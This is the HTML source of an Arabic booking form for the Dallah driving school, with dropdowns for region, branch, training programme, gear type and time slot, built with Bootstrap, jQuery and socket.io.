<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دلة للقيادة</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
    <script src="js/register2.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        .btn-warning {
            background-color: #D74D1C;
            border-color: #D74D1C;
            height: 50px;
        }

        .form-control,
        .form-select {
            height: 50px;
        }
    </style>
</head>

<body>

    <nav class="text-center py-2 shadow-sm">
        <img src="assets/logo.png" width="150" alt="">
    </nav>

    <div class="container mt-5">
        <h6 class="text-dark text-center fw-bold">يرجى ملأ النموذج التالي بالمعلومات المطلوبة</h6>

        <form action="" method="POST" class="mt-5 px-4" id="form">
            <label for="" class="mb-2 fw-bold">إختيار المنطقة <span class="text-danger fw-bold">*</span></label>
            <select name="region" required class="form-select">
                <option value="">إختيار المنطقة</option>
                <option value="جدة">جدة</option>
                <option value="الرياض">الرياض</option>
                <option value="تبوك">تبوك</option>
                <option value="القصيم">القصيم</option>
                <option value="الطائف">الطائف</option>
                <option value="جازان">جازان</option>
                <option value="الخبر">الخبر</option>
                <option value="الدمام">الدمام</option>
                <option value="مكة">مكة</option>
                <option value="حفر الباطن">حفر الباطن</option>
                <option value="عرعر">عرعر</option>
                <option value="أخرى">أخرى</option>
            </select>

            <label for="" class="mb-2 mt-4 fw-bold">إختر الفرع <span class="text-danger fw-bold">*</span></label>
            <select name="branch" required class="form-select">
                <option value="">إختر الفرع</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بجدة">فرع شركة دله لتعليم قيادة السيارات بجدة</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بالتخصصى - الرياض">فرع شركة دله لتعليم قيادة السيارات بالتخصصى - الرياض</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بالسلى - الرياض">فرع شركة دله لتعليم قيادة السيارات بالسلى - الرياض</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بالطائف">فرع شركة دله لتعليم قيادة السيارات بالطائف</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بالخرج">فرع شركة دله لتعليم قيادة السيارات بالخرج</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بجيزان">فرع شركة دله لتعليم قيادة السيارات بجيزان</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بالدوادمي">فرع شركة دله لتعليم قيادة السيارات بالدوادمي</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بالمجمعة">فرع شركة دله لتعليم قيادة السيارات بالمجمعة</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بوادى الدواسر">فرع شركة دله لتعليم قيادة السيارات بوادى الدواسر</option>
                <option value="فرع شركة دله لتعليم قيادة السيارات بشقراء">فرع شركة دله لتعليم قيادة السيارات بشقراء</option>
            </select>

            <label for="" class="mb-2 mt-4 fw-bold">إختيار المستوى <span class="text-danger fw-bold">*</span></label>
            <select name="level" required class="form-select">
                <option value="">إختيار المستوى</option>
                <option value="برنامج 30 ساعة">برنامج 30 ساعة</option>
                <option value="برنامج 15 ساعة">برنامج 15 ساعة</option>
                <option value="برنامج 12 ساعة">برنامج 12 ساعة</option>
                <option value="برنامج 6 ساعات">برنامج 6 ساعات</option>
                <option value="تحديد مستوى">تحديد مستوى</option>
                <option value="سداد رسوم">سداد رسوم</option>
                <option value="موعد مسبق">موعد مسبق</option>
                <option value="إختبار عملي">إختبار عملي</option>
                <option value="تدريب عملي">تدريب عملي</option>
                <option value="اختبار نظري">اختبار نظري</option>
                <option value="تدريب نظري">تدريب نظري</option>
                <option value="حجز موعد لاصدار الشهادة الصحية">حجز موعد لاصدار الشهادة الصحية</option>
                <option value="تجديد رخصة">تجديد رخصة</option>
                <option value="طباعة رخصة">طباعة رخصة</option>
            </select>

            <label for="" class="mb-2 mt-4 fw-bold">نوع الجير <span class="text-danger fw-bold">*</span></label>
            <select name="gear_type" required class="form-select">
                <option value="">نوع الجير</option>
                <option value="عادي">عادي</option>
                <option value="أوتوماتيك">أوتوماتيك</option>
            </select>

            <label for="" class="mb-2 mt-4 fw-bold">الفترة الزمنية <span class="text-danger fw-bold">*</span></label>
            <select name="time_period" required class="form-select">
                <option value="">الفترة الزمنية</option>
                <option value="الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً">الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً</option>
                <option value="الفترة المسائية من الساعة 2 مساءاً الى الساعة 8 مساءاً">الفترة المسائية من الساعة 2 مساءاً الى الساعة 8 مساءاً</option>
            </select>

            <div class="text-center mt-5">
                <button type="submit" name="submit" id="butSubm" class="btn btn-warning text-light fw-bold d-flex justify-content-center align-items-center w-100">متابعة</button>
            </div>
        </form>
    </div>

    <footer class="text-center mt-5">
        <img src="https://dalahdrivescars.com/assets/%C3%98%C2%B4%C3%98%C2%B1%C3%99%C6%92%C3%98%C2%A9-%C3%98%C2%AF%C3%99%E2%80%9E%C3%99%E2%80%A1-%C3%99%E2%80%9E%C3%98%C2%AA%C3%98%C2%B9%C3%99%E2%80%9E%C3%99%C5%A0%C3%99%E2%80%A6-%C3%99%E2%80%9A%C3%99%C5%A0%C3%98%C2%A7%C3%98%C2%AF%C3%98%C2%A9-%C3%98%C2%A7%C3%99%E2%80%9E%C3%98%C2%B3%C3%99%C5%A0%C3%98%C2%A7%C3%98%C2%B1%C3%98%C2%A7%C3%98%C2%AA.png" class="w-75 my-5" alt="">
    </footer>
    

</body>

</html>
